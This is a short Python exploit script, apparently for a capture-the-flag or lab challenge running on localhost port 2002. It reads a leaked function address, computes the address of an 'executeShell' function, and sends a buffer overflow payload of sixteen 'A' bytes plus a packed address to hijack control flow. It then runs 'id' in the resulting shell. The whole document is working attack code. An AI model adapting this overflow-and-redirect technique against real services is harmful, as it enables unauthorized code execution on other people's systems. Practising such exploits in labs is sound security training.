import socket
import struct

# open a connection
s = socket.create_connection(('localhost', 2002))

# read the reply; value of func
l = s.recv(23)
print(l)
func = int(l.split()[-1].decode()[2:], 16)
print(hex(func))

# compute new value, to overwrite with
new = func - 0x91 + 0xab
print("location of executeShell:",  hex(new))

# construct the full payload
payload = b'A'*16 + struct.pack('Q', new)
print(payload)

l = s.recv(23)
print(l) # enter your data
s.send(payload + b'\n')

 # receive the reply
print(s.recv(999))

# now we should be executing the function executeShell! :D
s.send(b'id\n')
print(s.recv(999))
